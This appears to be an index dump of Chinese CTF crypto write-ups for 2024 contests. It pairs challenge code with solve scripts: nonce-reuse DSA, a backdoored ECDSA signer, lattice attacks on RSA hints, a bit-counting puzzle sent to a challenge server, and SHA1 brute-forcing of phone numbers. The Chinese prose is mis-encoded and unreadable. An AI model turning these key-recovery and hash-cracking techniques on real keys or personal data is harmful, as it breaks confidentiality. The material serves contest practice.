(a*gx^2+gy^2)%p==(1+d*gx^2*gy^2)%p G=(gx,gy) eG = mul(e, G) print(eG) #eG = (34120664973166619886120801966861368419497948422807175421202190709822232354059, 11301243831592615312624457443883283529467532390028216735072818875052648928463) æ€è·¯ï¼šç½‘ä¸ŠæŸ¥äº†ä¸€ä¸‹ï¼Œè¿™æ˜¯çˆ±å¾·åæ›²çº¿ï¼ŒLä½¬çš„åšå®¢é‡Œé¢æœ‰æ˜ å°„å›å»çš„æ–¹æ³•ï¼Œè‡ªå·±å®ç°å°±å¥½äº† exp from Crypto.Util.number import * p = 64141017538026690847507665744072764126523219720088055136531450296140542176327 a = 362 d = 7 e=0x10001 c=1 eG = (34120664973166619886120801966861368419497948422807175421202190709822232354059, 11301243831592615312624457443883283529467532390028216735072818875052648928463) #part2 map to ECC F = GF(p) dd = F(d*c^4) A = F(2) * F(a+dd) / F(a-dd) B = F(4) / F(a-dd) a = F(3-A^2) / F(3*B^2) b = F(2*A^3-9*A) / F(27*B^3) def edwards_to_ECC(x,y): x1 = F(x) / F(c) y1 = F(y) / F(c) #now curve is a*x^2+y^2 = 1+dd*x^2*y^2 x2 = F(1+y1) / F(1-y1) y2 = F(x2) / F(x1) #now curve is By^2 = x^3 + Ax^2 + x x3 = (F(3*x2) + F(A)) / F(3*B) y3 = F(y2) / F(B) #now curve is y^2 = x^3 + ax + b return (x3,y3) def ECC_to_edwards(x,y): x2 = (F(x) * F(3*B) - F(A)) / F(3) y2 = F(y) * F(B) #now curve is By^2 = x^3 + Ax^2 + x x1 = F(x2) / F(y2) y1 = F(1) - (F(2) / F(x2+1)) #now curve is a*x^2+y^2 = 1+dd*x^2*y^2 x_ = F(x1) * F(c) y_ = F(y1) * F(c) #now curve is a*x^2+y^2 = c^2(1+d*x^2*y^2) return (x_,y_) E = EllipticCurve(GF(p), [a, b]) order = E.order() eG = E(edwards_to_ECC(eG[0],eG[1])) t = inverse(e,order) G = t*eG G = ECC_to_edwards(G[0],G[1]) print(long_to_bytes(int(G[0]))) ","date":"2024-12-12","objectID":"/%E5%9B%BD%E5%9F%8E%E6%9D%AF2024_crypto/:2:2","tags":["crypto"],"title":"å›½åŸæ¯2024_crypto","uri":"/%E5%9B%BD%E5%9F%8E%E6%9D%AF2024_crypto/"},{"categories":["CTF"],"content":"ez_sign task from Crypto.Util.number import * from gmpy2 import * from hashlib import* import random,os flag = b'D0g3xGA{***************}' msg = b'e=?' def sign(pub, pri, k): (p,q,g,y) = pub x = pri r = int(powmod(g, k, p) % q) H = bytes_to_long(sha1(os.urandom(20)).digest()) s = int((H + r * x) * invert(k, q) % q) return (H,r,s) k1 = getPrime(64) k2 = k1 ** 2 pri = bytes_to_long(msg) a = 149328490045436942604988875802116489621328828898285420947715311349436861817490291824444921097051302371708542907256342876547658101870212721747647670430302669064864905380294108258544172347364992433926644937979367545128905469215614628012983692577094048505556341118385280805187867314256525730071844236934151633203 b = 829396411171540475587755762866203184101195238207 g = 87036604306839610565326489540582721363203007549199721259441400754982765368067012246281187432501490614633302696667034188357108387643921907247964850741525797183732941221335215366182266284004953589251764575162228404140768536534167491117433689878845912406615227673100755350290475167413701005196853054828541680397 y = 97644672217092534422903769459190836176879315123054001151977789291649564201120414036287557280431608390741595834467632108397663276781265601024889217654490419259208919898180195586714790127650244788782155032615116944102113736041131315531765220891253274685646444667344472175149252120261958868249193192444916098238 pub = (a, b, g, y) H1, r1, s1 = sign(pub, pri, k1) H2, r2, s2 = sign(pub, pri, k2) p = getPrime(128) q = getPrime(128) n = p * q c = powmod(bytes_to_long(flag), e, n) C = p**2 + q**2 print(f'(H1, r1, s1) = {H1}, {r1}, {s1}') print(f'(H2, r2, s2) = {H2}, {r2}, {s2}') print(c) print(C) ''' (H1, r1, s1) = 659787401883545685817457221852854226644541324571, 334878452864978819061930997065061937449464345411, 282119793273156214497433603026823910474682900640 (H2, r2, s2) = 156467414524100313878421798396433081456201599833, 584114556699509111695337565541829205336940360354, 827371522240921066790477048569787834877112159142 c = 18947793008364154366082991046877977562448549186943043756326365751169362247521 C = 179093209181929149953346613617854206675976823277412565868079070299728290913658 ''' æ€è·¯ï¼šä¸»è¦æ˜¯ä¸¤éƒ¨åˆ† ç¬¬ä¸€éƒ¨åˆ†ï¼Œdsaæ±‚è§£eï¼Œk1=k,k2=k**2ï¼Œè¿™ä¸€éƒ¨åˆ†å…¶å®nssçš„å·¥åŠé‡Œé¢çš„dsaæœ‰è®²è¿‡ï¼Œå“¥ä»¬å°±ä¸ç°æ¨äº†ï¼Œå…¬å¼å¤ªéš¾æ•²äº† a = 149328490045436942604988875802116489621328828898285420947715311349436861817490291824444921097051302371708542907256342876547658101870212721747647670430302669064864905380294108258544172347364992433926644937979367545128905469215614628012983692577094048505556341118385280805187867314256525730071844236934151633203 b = 829396411171540475587755762866203184101195238207 g = 87036604306839610565326489540582721363203007549199721259441400754982765368067012246281187432501490614633302696667034188357108387643921907247964850741525797183732941221335215366182266284004953589251764575162228404140768536534167491117433689878845912406615227673100755350290475167413701005196853054828541680397 y = 97644672217092534422903769459190836176879315123054001151977789291649564201120414036287557280431608390741595834467632108397663276781265601024889217654490419259208919898180195586714790127650244788782155032615116944102113736041131315531765220891253274685646444667344472175149252120261958868249193192444916098238 from Crypto.Util.number import * p, q, g, y = a, b, g, y (h1, r1, s1) = 659787401883545685817457221852854226644541324571, 334878452864978819061930997065061937449464345411, 282119793273156214497433603026823910474682900640 (h2, r2, s2) = 156467414524100313878421798396433081456201599833, 584114556699509111695337565541829205336940360354, 827371522240921066790477048569787834877112159142 PR.\u003cx\u003e = PolynomialRing(GF(q)) f = s2*x^2*r1 - s1*x*r2 - h2*r1 + h1*r2 print(f.roots()) k = int(f.roots()[1][0]) x = (s1*k - h1) * inverse(r1, q) % q print(long_to_bytes(x)) è¿™ä¸€éƒ¨åˆ†æ±‚å‡ºæ¥e=44519 ç¬¬äºŒéƒ¨åˆ†ï¼Œå‘ç°ç›´æ¥æ±‚è§£mæ˜¯é”™è¯¯çš„ï¼Œæˆ‘å°±åœ¨æƒ³ï¼Œæ˜¯ä¸æ˜¯m\u003ençš„æƒ…å†µï¼Œäºæ˜¯æˆ‘å°±å°è¯•äº†ç¾ŠåŸæ¯2024å¹´çš„æ–¹æ³•ï¼Œæƒ³é€šè¿‡çˆ†ç ´æ ¼å»å†™ï¼Œå‘ç°é”™äº†ï¼Œç„¶åæ„è¯†åˆ°å¯èƒ½æ˜¯C=p2+q2æœ‰å¤šè§£ï¼Œç”¨sagemathç›´æ¥æ±‚è§£çš„æ˜¯é”™è¯¯çš„ï¼Œèµ›åå‘ç°å¯ä»¥åˆ©ç”¨å¤å¹³é¢æ±‚è§£ï¼ŒçœŸçš„å­¦åˆ°äº†ï¼Œå½“ç„¶ï¼Œä¹Ÿå¯ä»¥åˆ©ç”¨https://www.alpertron.com.ar/QUAD.HTM è¿™ä¸ªç½‘ç«™è¿›è¡Œç›´æ¥æ±‚è§£ï¼Œä¼šç›´æ¥è§£å‡ºå¤šç»„pqï¼ŒçœŸçš„å¾ˆå¥½","date":"2024-12-12","objectID":"/%E5%9B%BD%E5%9F%8E%E6%9D%AF2024_crypto/:2:3","tags":["crypto"],"title":"å›½åŸæ¯2024_crypto","uri":"/%E5%9B%BD%E5%9F%8E%E6%9D%AF2024_crypto/"},{"categories":["CTF"],"content":"æ€»ç»“ åªèƒ½è¯´æœ‰é—æ†¾å§ï¼Œæ²¡æœ‰akå¯†ç ï¼Œä¹Ÿæ²¡æœ‰è¿›å…¥çº¿ä¸‹ï¼Œä½†æ˜¯çœ‹è§é˜Ÿå‹éƒ½å¾ˆåŠªåŠ›ï¼Œå¥½åƒä¹Ÿéƒ½æ˜¯å€¼å¾—çš„ï¼ŒåŠ æ²¹åŠ æ²¹ ","date":"2024-12-12","objectID":"/%E5%9B%BD%E5%9F%8E%E6%9D%AF2024_crypto/:3:0","tags":["crypto"],"title":"å›½åŸæ¯2024_crypto","uri":"/%E5%9B%BD%E5%9F%8E%E6%9D%AF2024_crypto/"},{"categories":["CTF"],"content":" å‰è¨€ åº”è¯¥æ˜¯è¿™ä¸ªæš‘å‡é‡Œé¢(ç›®å‰)æ‰“çš„æœ€éš¾çš„ä¸€åœºäº†ï¼Œç›¸æ¯”äºdasï¼Œä»–å°±ä¸Šä¸€ä¸ªå¯†ç é¢˜å•Šæˆ‘é ï¼Œå…«ä¸ªå°æ—¶ï¼Œä¸Šäº†ä¸‰æ³¢é¢˜ï¼Œå°±å¼€å±€ä¸€ä¸ªå¯†ç ï¼Œè¿˜æ˜¯æ²¡å†™è¿‡çš„ECDSAåŠ å¯†ï¼Œå†™ä¸å‡ºæ¥å°±å¾ˆå°´å°¬ä¹Ÿå¾ˆç—›è‹¦ é¢˜ç›® task from ecdsa.ecdsa import * from Crypto.Util.number import * import hashlib import gmpy2 def inverse_mod(a, m): if a == 0: return 0 return gmpy2.powmod(a, -1, m) def bit_length(x): return x.bit_length() def get_malicious_key(): a = 751818 b = 1155982 w = 908970521 X = 20391992 return a, b, w, X class RSZeroError(RuntimeError): pass class InvalidPointError(RuntimeError): pass class Signature(object): \"\"\"ECDSA signature.\"\"\" def __init__(self, r, s): self.r = r self.s = s class Public_key(object): \"\"\"Public key for ECDSA.\"\"\" def __init__(self, generator, point, verify=True): self.curve = generator.curve() self.generator = generator self.point = point n = generator.order() p = self.curve.p() if not (0 \u003c= point.x() \u003c p) or not (0 \u003c= point.y() \u003c p): raise InvalidPointError( \"The public point has x or y out of range.\" ) if verify and not self.curve.contains_point(point.x(), point.y()): raise InvalidPointError(\"Point does not lay on the curve\") if not n: raise InvalidPointError(\"Generator point must have order.\") if ( verify and self.curve.cofactor() != 1 and not n * point == ellipticcurve.INFINITY ): raise InvalidPointError(\"Generator point order is bad.\") class Private_key(object): \"\"\"Private key for ECDSA.\"\"\" def __init__(self, public_key, secret_multiplier): self.public_key = public_key self.secret_multiplier = secret_multiplier def sign(self, hash, random_k): G = self.public_key.generator n = G.order()# è·å–è¯¥æ¤­åœ†æ¨¡æ•° k = random_k % n p1 = k * G r = p1.x() % n if r == 0: raise RSZeroError(\"amazingly unlucky random number r\") s = ( inverse_mod(k, n) * (hash + (self.secret_multiplier * r) % n) ) % n if s == 0: raise RSZeroError(\"amazingly unlucky random number s\") return Signature(r, s) def malicious_sign(self,hash, random_k, a, b, w, X): # t = random.randint(0,1) t = 1 G = self.public_key.generator Y = X * G n = G.order() k1 = random_k z = (k1 - w * t) * G + (-a * k1 - b) * Y zx = z.x() % n k2 = int(hashlib.sha1(str(zx).encode()).hexdigest(), 16) #print(f'k2 = {k2}') p1 = k2 * G r = p1.x() % n if r == 0: raise RSZeroError(\"amazingly unlucky random number r\") s = ( inverse_mod(k2, n) * (hash + (self.secret_multiplier * r) % n) ) % n if s == 0: raise RSZeroError(\"amazingly unlucky random number s\") return (Signature(r, s),k2) if __name__ == '__main__': a,b,w,X = get_malicious_key() message1 = b'It sounds as though you were lamenting,' message2 = b'a butterfly cooing like a dove.' hash_message1 = int(hashlib.sha1(message1).hexdigest(), 16) hash_message2 = int(hashlib.sha1(message2).hexdigest(), 16) private = getRandomNBitInteger(50) rand = getRandomNBitInteger(49) public_key = Public_key(generator_192, generator_192 * private) private_key = Private_key(public_key, private) sig = private_key.sign(hash_message1, rand) malicious_sig,k2 = private_key.malicious_sign(hash_message2, rand, a,b,w,X) print(a,b,w,X) print(sig.r) print(malicious_sig.r) ''' 751818 1155982 908970521 20391992 sig.r=6052579169727414254054653383715281797417510994285530927615 malicious_sig.r=3839784391338849056467977882403235863760503590134852141664 ''' # flagä¸ºflag{uuid}æ ¼å¼ flag = b'' m = bytes_to_long(flag) p = k2 for i in range(99): p = gmpy2.next_prime(p) q = gmpy2.next_prime(p) e = 65537 c = pow(m,e,p*q) print(c) # 1294716523385880392710224476578009870292343123062352402869702505110652244504101007338338248714943 å†™é¢˜çš„æ—¶å€™æœ‰ä¸€äº›åœ°æ–¹è¢«æˆ‘æ”¹äº†ä¸€ç‚¹ç‚¹ï¼Œåº”è¯¥å¯ä»¥çœ‹å‡ºæ¥ï¼ˆï¼‰ æ€è·¯ åˆšæ‹¿åˆ°è¿™ä¸ªé¢˜ç›®çš„æ—¶å€™ç¬¬ä¸€æƒ³æ³•æ˜¯æ¢å¤k1å†å»æ¢å¤k2ï¼Œç¬¬äºŒéè¯»ä»£ç çš„æ—¶å€™çœ‹è§ public_key = Public_key(generator_192, generator_192 * private),è¿™å°±ç¡®å®šäº†è¿™ä¸ªæ›²çº¿æ˜¯curve_192ï¼Œæˆ‘åˆçŸ¥é“rï¼Œé‚£æˆ‘å°±å¯ä»¥ç›´æ¥å»æ±‚å‡ºpï¼Œæ±‚pè¿™é‡Œæ–¹æ³•æ¯”è¾ƒå¤šï¼Œåœ¨ç½‘ä¸Šæ‰¾äº†ä¸ªäºŒæ¬¡å‰©ä½™çš„æ–¹æ³•ï¼Œæ±‚å‡ºpã€‚ $$z = (k1 - w * t) * G + (-a * k1 - b) * Y $$ $$åŒ–ç®€æˆ$$$$z=p1+(-w)*G+(-a)*X*p1+(-b)*X*G$$é‚£ä¹ˆè¿™ä¸ªé¢˜å°±å‡ºæ¥äº† exp import hashlib import gmpy2 from Crypto.Util.number import * r1=6052579169727414254054653383715281797417510994285530927615 #curve_192 p=6277101735386680763835789423207666416083908700390324961279 a=-3 b=2455155546008943817740293915197451784769108058161191238065 def convert_to","date":"2024-12-12","objectID":"/%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A22024crypto/:0:0","tags":["crypto"],"title":"å·…å³°æå®¢2024_crypto","uri":"/%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A22024crypto/"},{"categories":["CTF"],"content":"å‰è¨€ ä¸€å…±ä¸ƒé¢˜ï¼Œå‡ºäº†ä¸‰ä¸ªï¼Œä½†æ˜¯æµ·é²œå¸‚åœºä¸Šé¢å·²ç»pyçƒ‚äº†ï¼Œæˆ‘è¯¥å–œè¿˜æ˜¯è¯¥å¿§å‘¢ï¼Ÿåœ¨è¿™é‡Œå°±åªå†™ä¸Šè‡ªå·±å·²ç»å‡ºäº†çš„é¢˜ï¼Œå…¶ä»–çš„æ…¢æ…¢å¤ç°ï¼Œæœ€è¿‘æœŸä¸­è€ƒè¯•+é¦™æ¸¯æ¯”è¾ƒå¿™ã€‚ ","date":"2024-12-12","objectID":"/%E5%BC%BA%E7%BD%91%E6%9D%AF2024_crypto/:1:0","tags":["crypto"],"title":"å¼ºç½‘æ¯2024_crypto","uri":"/%E5%BC%BA%E7%BD%91%E6%9D%AF2024_crypto/"},{"categories":["CTF"],"content":"é¢˜ç›® ","date":"2024-12-12","objectID":"/%E5%BC%BA%E7%BD%91%E6%9D%AF2024_crypto/:2:0","tags":["crypto"],"title":"å¼ºç½‘æ¯2024_crypto","uri":"/%E5%BC%BA%E7%BD%91%E6%9D%AF2024_crypto/"},{"categories":["CTF"],"content":"EzRsa task from Crypto.Util.number import long_to_bytes, bytes_to_long, getPrime import random, gmpy2 class RSAEncryptor: def __init__(self): self.g = self.a = self.b = 0 self.e = 65537 self.factorGen() self.product() def factorGen(self): while True: self.g = getPrime(500) while not gmpy2.is_prime(2*self.g*self.a+1): self.a = random.randint(2**523, 2**524) while not gmpy2.is_prime(2*self.g*self.b+1): self.b = random.randint(2**523, 2**524) self.h = 2*self.g*self.a*self.b+self.a+self.b if gmpy2.is_prime(self.h): self.N = 2*self.h*self.g+1 print(len(bin(self.N))) return def encrypt(self, msg): return gmpy2.powmod(msg, self.e, self.N) def product(self): with open('/flag', 'rb') as f: self.flag = f.read() self.enc = self.encrypt(self.flag) self.show() print(f'enc={self.enc}') def show(self): print(f\"N={self.N}\") print(f\"e={self.e}\") print(f\"g={self.g}\") RSAEncryptor() æ€è·¯ï¼š é‡ç‚¹ä»£ç æ˜¯ $$ h=2gab+a+b $$ å’Œ $$ N=2hg+1 $$,æˆ‘ä»¬è®² $$N$$ç›´æ¥å±•å¼€,å…¶å®å°±æ˜¯ $$ N=(2ga+1)(2gb+1) $$,è¿™ä¸ªå°±æ˜¯è€ç†Ÿäººäº†ï¼ŒCommon Prime Rsa,å¯ä»¥å‚è€ƒç‹¬å¥çš„æ–‡ç« ï¼Œæ˜“çŸ¥æ˜¯ $$g","date":"2024-12-12","objectID":"/%E5%BC%BA%E7%BD%91%E6%9D%AF2024_crypto/:2:1","tags":["crypto"],"title":"å¼ºç½‘æ¯2024_crypto","uri":"/%E5%BC%BA%E7%BD%91%E6%9D%AF2024_crypto/"},{"categories":["CTF"],"content":"apbq task from Crypto.Util.number import * from secrets import flag from math import ceil import sys class RSA(): def __init__(self, privatekey, publickey): self.p, self.q, self.d = privatekey self.n, self.e = publickey def encrypt(self, plaintext): if isinstance(plaintext, bytes): plaintext = bytes_to_long(plaintext) ciphertext = pow(plaintext, self.e, self.n) return ciphertext def decrypt(self, ciphertext): if isinstance(ciphertext, bytes): ciphertext = bytes_to_long(ciphertext) plaintext = pow(ciphertext, self.d, self.n) return plaintext def get_keypair(nbits, e = 65537): p = getPrime(nbits//2) q = getPrime(nbits//2) n = p * q d = inverse(e, n - p - q + 1) return (p, q, d), (n, e) if __name__ == '__main__': pt = './output.txt' fout = open(pt, 'w') sys.stdout = fout block_size = ceil(len(flag)/3) flag = [flag[i:i+block_size] for i in range(0, len(flag), block_size)] e = 65537 print(f'[+] Welcome to my apbq game') # stage 1 print(f'â”ƒ stage 1: p + q') prikey1, pubkey1 = get_keypair(1024) RSA1 = RSA(prikey1, pubkey1) enc1 = RSA1.encrypt(flag[0]) print(f'â”ƒ hints = {prikey1[0] + prikey1[1]}') print(f'â”ƒ public key = {pubkey1}') print(f'â”ƒ enc1 = {enc1}') print(f'----------------------') # stage 2 print(f'â”ƒ stage 2: ai*p + bi*q') prikey2, pubkey2 = get_keypair(1024) RSA2 = RSA(prikey2, pubkey2) enc2 = RSA2.encrypt(flag[1]) kbits = 180 a = [getRandomNBitInteger(kbits) for i in range(100)] b = [getRandomNBitInteger(kbits) for i in range(100)] c = [a[i]*prikey2[0] + b[i]*prikey2[1] for i in range(100)] print(f'â”ƒ hints = {c}') print(f'â”ƒ public key = {pubkey2}') print(f'â”ƒ enc2 = {enc2}') print(f'----------------------') # stage 3 print(f'â”ƒ stage 3: a*p + q, p + bq') prikey3, pubkey3 = get_keypair(1024) RSA3 = RSA(prikey3, pubkey3) enc3 = RSA2.encrypt(flag[2]) kbits = 512 a = getRandomNBitInteger(kbits) b = getRandomNBitInteger(kbits) c1 = a*prikey3[0] + prikey3[1] c2 = prikey3[0] + b*prikey3[1] print(f'â”ƒ hints = {c1, c2}') print(f'â”ƒ public key = {pubkey3}') print(f'â”ƒ enc3 = {enc3}') part1 å·²çŸ¥ $$pq=n,p+q=hints$$,ç›´æ¥åˆ©ç”¨sympyè§£æ–¹ç¨‹å°±å¯ä»¥äº† exp c= pq = n= e=65537 from Crypto.Util.number import * from sympy import* p, q = symbols('p q') eq1 = Eq(p+q, pq) eq2 = Eq(p*q, n) sol = solve((eq1, eq2), (p, q)) print(sol) p= q= phi=(p-1)*(q-1) d = inverse(e, phi) m = pow(c, d, n) print(long_to_bytes(m)) part2 å·²çŸ¥ $$h=ap+bq$$,è€Œä¸”æœ‰ä¸€ç™¾ç»„ï¼Œpqéƒ½æ˜¯512bitsï¼Œè€Œabæ˜¯180bitsï¼Œæœ‰è¿™æ ·å°çš„æ•°ï¼Œæˆ‘ä»¬å°±å¯ä»¥æƒ³åˆ°ç”¨æ ¼ï¼Œå› ä¸ºè‡ªå·±å¤ªèœï¼Œç›´æ¥æ‰¾åˆ°äº†ductf2023å¹´çš„expï¼Œæ”¹æˆä¸€ç™¾ç»„ï¼Œå°±ç›´æ¥å‡ºæ¥äº†ï¼ˆå¥½åƒå››ç»„å°±è¡Œï¼‰ exp import itertools from Crypto.Util.number import long_to_bytes, GCD from sage.all import Matrix, ZZ, QQ, ideal hints = n = e = 65537 c = V = hints k = 2**400 M = Matrix.column([k * v for v in V]).augment(Matrix.identity(len(V))) B = [b[1:] for b in M.LLL()] M = (k * Matrix(B[:len(V)-2])).T.augment(Matrix.identity(len(V))) B = [b[-len(V):] for b in M.LLL() if set(b[:len(V)-2]) == {0}] for combination in itertools.product(range(101), repeat=2): T = combination[0] * B[0] + combination[1] * B[1] a = T[:len(V)] kq = GCD(a[1] * hints[0] - a[0] * hints[1], n) if 1 \u003c kq \u003c n: print('find!', kq, combination[0], combination[1]) break for i in range(2**16, 1, -1): if kq % i == 0: kq //= i q = int(kq) p = int(n // kq) print(p, q) part3 å†™äº†ä¸€ä¸ªå°æ—¶ï¼Œç„¶åå‘ç°ç”¨çš„ç¬¬äºŒç»„å¯†é’¥åŠ å¯†çš„ï¼ŒçœŸçš„éš¾å´© æ­£ç¡®å†™æ³•å¯ä»¥å‚è€ƒè¿™ä¸ªå¸–å­ ","date":"2024-12-12","objectID":"/%E5%BC%BA%E7%BD%91%E6%9D%AF2024_crypto/:2:2","tags":["crypto"],"title":"å¼ºç½‘æ¯2024_crypto","uri":"/%E5%BC%BA%E7%BD%91%E6%9D%AF2024_crypto/"},{"categories":["CTF"],"content":"21step task import re import random from secrets import flag print(f'Can you weight a 128 bits number in 21 steps') pattern = r'([AB]|\\d+)=([AB]|\\d+)(\\+|\\-|\\*|//|\u003c\u003c|\u003e\u003e|\u0026|\\^|%)([AB]|\\d+)' command = input().strip() assert command[-1] == ';' assert all([re.fullmatch(pattern, i) for i in command[:-1].split(';')]) step = 21 for i in command[:-1].split(';'): t = i.translate(str.maketrans('', '', '=AB0123456789')) if t in ['\u003e\u003e', '\u003c\u003c', '+', '-', '\u0026', '^']: step -= 1 elif t in ['*', '/', '%']: step -= 3 if step \u003c 0:exit() success = 0 w = lambda x: sum([int(i) for i in list(bin(x)[2:])]) for _ in range(100): A = random.randrange(0, 2**128) wa = w(A) B = 0 try : exec(\"global A; global B;\" + command) except : exit() if A == wa: success += 1 if success == 100: print(flag) æ€è·¯ï¼šå¾ˆç›´æ¥çš„é¢˜ç›®ï¼Œä¸€ä¸ª128bitsçš„æ•°ï¼Œåœ¨21æ­¥ç®—å‡ºä»–äºŒè¿›åˆ¶ä¸­ä¸€çš„æ•°é‡ï¼Œç›´æ¥æ‰¾åˆ°Integerçš„ç±»å‹æºç ï¼Œæ”¹æˆ128ä½å°±å¥½äº† exp from pwn import * io = remote('39.107.90.219', 22677) command = 'B=A\u003e\u003e1;B=B\u0026113427455640312821154458202477256070485;A=A-B;B=A\u003e\u003e2;B=B\u002668056473384187692692674921486353642291;A=A\u002668056473384187692692674921486353642291;A=A+B;B=A\u003e\u003e4;A=A+B;A=A\u002620016609818878733144904388672456953615;B=A\u003e\u003e8;A=A+B;B=A\u003e\u003e16;A=A+B;B=A\u003e\u003e32;A=A+B;B=A\u003e\u003e64;A=A+B;A=A\u0026127;' io.recvuntil(b'Can you weight a 128 bits number in 21 steps') for i in range(100): io.sendline(command) io.recvline() io.interactive() ","date":"2024-12-12","objectID":"/%E5%BC%BA%E7%BD%91%E6%9D%AF2024_crypto/:2:3","tags":["crypto"],"title":"å¼ºç½‘æ¯2024_crypto","uri":"/%E5%BC%BA%E7%BD%91%E6%9D%AF2024_crypto/"},{"categories":["CTF"],"content":"æ€»ç»“ æ²¡æœ‰çˆ†é›¶ï¼ï¼ï¼å…¶ä»–çš„æ…¢æ…¢å¤ç°æ›´æ–° ","date":"2024-12-12","objectID":"/%E5%BC%BA%E7%BD%91%E6%9D%AF2024_crypto/:3:0","tags":["crypto"],"title":"å¼ºç½‘æ¯2024_crypto","uri":"/%E5%BC%BA%E7%BD%91%E6%9D%AF2024_crypto/"},{"categories":["CTF"],"content":"å‰è¨€ æŠ¥åäº†ï¼Œä½†æ˜¯æ²¡æ‰“ï¼Œåˆšå›å®¶ï¼Œå°±è¢«äº²æˆšæ‹‰è¿‡å»ä¸²é—¨äº†ï¼Œç„¶åä¸­é—´è¿˜æœ‰ä¸€å¤©è¥¿æ¹–è®ºå‰‘ï¼Œå®³ ","date":"2024-12-12","objectID":"/%E6%98%A5%E7%A7%8B%E6%9D%AF%E5%86%AC%E5%AD%A3%E8%B5%9B2024_crypto/:1:0","tags":["crypto"],"title":"æ˜¥ç§‹æ¯å†¬å­£èµ›2024_crypto","uri":"/%E6%98%A5%E7%A7%8B%E6%9D%AF%E5%86%AC%E5%AD%A3%E8%B5%9B2024_crypto/"},{"categories":["CTF"],"content":"é¢˜ç›® ","date":"2024-12-12","objectID":"/%E6%98%A5%E7%A7%8B%E6%9D%AF%E5%86%AC%E5%AD%A3%E8%B5%9B2024_crypto/:2:0","tags":["crypto"],"title":"æ˜¥ç§‹æ¯å†¬å­£èµ›2024_crypto","uri":"/%E6%98%A5%E7%A7%8B%E6%9D%AF%E5%86%AC%E5%AD%A3%E8%B5%9B2024_crypto/"},{"categories":["CTF"],"content":"é€šå¾€å“ˆå¸Œçš„æ—…ç¨‹ é¢˜ç›®å†…å®¹ï¼š åœ¨æ•°å­—åŸï¼Œå¤§å®¶éƒ½æ˜¯é€šè¿‡æ˜¯é€šè¿‡æ•°å­—ç”µè¯è¿›è¡Œçš„é€šä¿¡,å¸¸è§æ˜¯ä»¥188å¼€å¤´çš„11ä½çº¯è¡€å·ç ç»„æˆï¼Œäºšå†å±±å¤§æŠµåœ¨ä¸€ä¸ªç‰¹æ®Šçš„åœ°æ–¹æˆªè·ä¸€ä¸²ç‰¹æ®Šçš„å­—ç¬¦ä¸²\"ca12fd8250972ec363a16593356abb1f3cf3a16d\"ï¼Œé€šè¿‡æŸ¥é˜…å‘ç°è¿™ä¸ªè·Ÿä»¥å‰æ•£è½çš„å›½åº¦æœ‰ç‚¹ç›¸ä¼¼ï¼Œå¯èƒ½æ˜¯å»å¾€å“ˆå¸Œå›½åº¦çš„ã€‚å¹´è½»ç¨‹åºå‘˜äºšåŠ›å±±å¤§æŠµå¯¹è¿™ä¸ªå›½åº¦å……æ»¡å¥½å¥‡ï¼Œå†³å®šç ´è¯‘è¿™ä¸ªå“ˆå¸Œå€¼ã€‚åœ¨ç»è¿‡ä¸€æ®µæ—¶é—´çš„æ‘¸ç´¢åï¼ŒäºšåŠ›å±±å¤§æŠµå‡­å€Ÿå¼ºå¤§çš„ç¼–ç¨‹å®åŠ›æˆåŠŸç ´è§£ï¼Œåœ¨è¾“å…¥å¯¹åº”å­—ç¬¦ä¸²åç¬é—´è¢«ä¼ é€åˆ°ä¸€ä¸ªå¥‡å¹»çš„æ•°æ®ä¸–ç•Œï¼ŒåŒæ—¶äºšåŠ›å±±å¤§æŠµä¹Ÿå¼€å§‹äº†ä»–çš„è¿›ä¿®ä¹‹è·¯ã€‚(æäº¤æ ¼å¼ï¼šflag{11ä½å·ç }ï¼‰ å³å·²çŸ¥å‰ä¸‰ä½ï¼Œçˆ†ç ´å…«ä½ï¼Œå¥½åƒcmd5å·²ç»æœ‰äº† import hashlib def crack_hash(target_hash): prefix = \"188\" for num in range(100000000): phone_number = prefix + f\"{num:08d}\" generated_hash = hashlib.sha1(phone_number.encode()).hexdigest() if generated_hash == target_hash: return phone_number return None target_hash = \"ca12fd8250972ec363a16593356abb1f3cf3a16d\" result = crack_hash(target_hash) if result: print(f\"ç ´è§£æˆåŠŸï¼ç”µè¯å·ç ä¸ºï¼šflag{{{result}}}\") else: print(\"ç ´è§£å¤±è´¥ï¼Œæœªæ‰¾åˆ°åŒ¹é…çš„å·ç ã€‚\") ","date":"2024-12-12","objectID":"/%E6%98%A5%E7%A7%8B%E6%9D%AF%E5%86%AC%E5%AD%A3%E8%B5%9B2024_crypto/:2:1","tags":["crypto"],"title":"æ˜¥ç§‹æ¯å†¬å­£èµ›2024_crypto","uri":"/%E6%98%A5%E7%A7%8B%E6%9D%AF%E5%86%AC%E5%AD%A3%E8%B5%9B2024_crypto/"},{"categories":["CTF"],"content":"ä½ æ˜¯å°å“ˆæ–¯? é¢˜ç›®å†…å®¹ï¼š å¹´è½»é»‘å®¢å°ç¬¦å‚åŠ CTFå¤§èµ›ï¼Œä»–å‘ç°è¿™ä¸ªå°å“ˆæ–¯æ–‡ä»¶çš„å†…å®¹å­˜åœ¨é«˜åº¦è§„å¾‹æ€§ï¼Œå¹¶ä¸”æ–‡ä»¶åä¸­æœ‰éšè—ä¿¡æ¯ï¼Œä»–æˆåŠŸæ‰¾åˆ°äº†éšè—çš„ä¿¡æ¯ï¼Œå¹¶ç ´è§£äº†æŒ‘æˆ˜ã€‚å¾—æ„åœ°è¯´ï¼šâ€œæˆåŠŸåœ¨äºæ¢ç´¢ä¸è´¨ç–‘ï¼Œç¢°æ’æ˜¯å‘ç°çœŸç›¸çš„å…³é”®ï¼â€ ä¸€ä¸ªä¸€ä¸ªæ˜ å°„è¿‡å»ï¼Œsha256ï¼Œsha1ï¼Œmd5éƒ½è¯•ä¸€ä¸‹ï¼Œå‘ç°æ˜¯sha1ï¼Œç»“æœå¥½åƒå¯ä»¥ä»160bitsçœ‹å‡ºæ¥è¿™æ˜¯sha1 import hashlib import string def attack(h): table = string.ascii_letters + string.digits + \"!@#$%^\u0026*()_+-=[]{}|;:,.\u003c\u003e?/~`\" for m in table: if hashlib.sha1(m.encode()).hexdigest() == h: return m return None data = open('chall.txt', 'r').readlines() hashes = [] for i in data: hashes.append(i.strip()) table = {} for i in hashes: table[i] = attack(i) m = \"\" for i in hashes: if table[i] is not None: m += table[i] print(m) 